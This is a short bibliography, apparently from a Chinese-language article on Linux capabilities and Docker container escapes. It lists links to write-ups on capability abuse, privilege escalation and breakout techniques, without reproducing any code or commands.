`[2]` ambient.c: _https://s3hh.wordpress.com/2015/07/25/ambient-capabilities/_  
`[3]` 默认的Capabilities: _https://github.com/moby/moby/blob/master/oci/caps/defaults.go_  
`[4]` 容器配置Capabilities: _https://kubernetes.io/zh-cn/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container_  
`[5]` LinPEAS: _https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS_  
`[6]` 理解Docker容器转义: _https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/_  
`[7]` Docker容器突破:滥用SYS MODULE能力: _https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd_  
`[8]` 破解 Play-with-Docker 并在主机上远程运行代码: _https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host_  
`[9]` 在允许 ptrace 时绕过 seccomp: _https://gist.github.com/thejh/8346f47e359adecd1d53_  
`[10]` python Capabilities cap\_sys\_ptrace+ep提权: _https://www.cnblogs.com/zlgxzswjy/p/15185591.html_  
`[11]` Shellcode注入: _https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc_  
`[12]` shocker: _https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3_